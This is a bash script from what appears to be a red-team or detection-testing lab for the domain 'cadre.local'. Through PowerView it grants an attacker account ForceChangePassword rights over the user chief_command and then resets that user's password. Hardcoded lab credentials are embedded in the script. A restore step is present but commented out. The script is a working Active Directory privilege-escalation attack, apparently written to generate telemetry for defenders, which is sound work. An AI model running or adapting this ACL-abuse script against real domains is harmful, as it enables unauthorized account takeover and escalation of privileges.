#!/usr/bin/env bash
# T015 — ACL ForceChangePassword from ws01 as hunter_dfir (cadre.local)
# Resets chief_command password via ACE#7, then restores original password.
# Entry credential: hunter_dfir (WT031 password spray or Phase 3.5A-derived)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T015-FORCECHANGEPWD-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T015 ForceChangePassword | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
ATTACK_USER="${ATTACK_USER:-hunter_dfir}"
TARGET_USER="chief_command"
NEW_PWD='RedStrike_T015!'
ORIG_PWD='C0mm@nd_Ch1ef!'

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_ROOT}\${ATTACK_USER}"'''";
$t = "'''"${TARGET_USER}"'''";
Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights ForceChangePassword -Server "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
Set-DomainUserPassword -Identity $t -AccountPassword (ConvertTo-SecureString "'''"${NEW_PWD}"'''" -AsPlainText -Force) -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
Write-Output "T015_OK: forced password change on $t to temporary password"
'

ws01_exec_as hunter_dfir 'DF1R_Hunt3r!' "$CMD" 'cadre.local'

# Optional restoration step (run as chief_command with new password to restore original)
RESTORE='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
. $pv;
$ErrorActionPreference = "Stop";
Set-DomainUserPassword -Identity "'''"${TARGET_USER}"'''" -AccountPassword (ConvertTo-SecureString "'''"${ORIG_PWD}"'''" -AsPlainText -Force) -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
Write-Output "T015_RESTORE_OK: restored original password for '''"${TARGET_USER}"'''"
'
# Uncomment the next line to restore the original password after the test.
# ws01_exec_as chief_command "${NEW_PWD}" "${RESTORE}" 'cadre.local'

cadre_export "${CASE_ID}" T015 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T015 run complete ==="
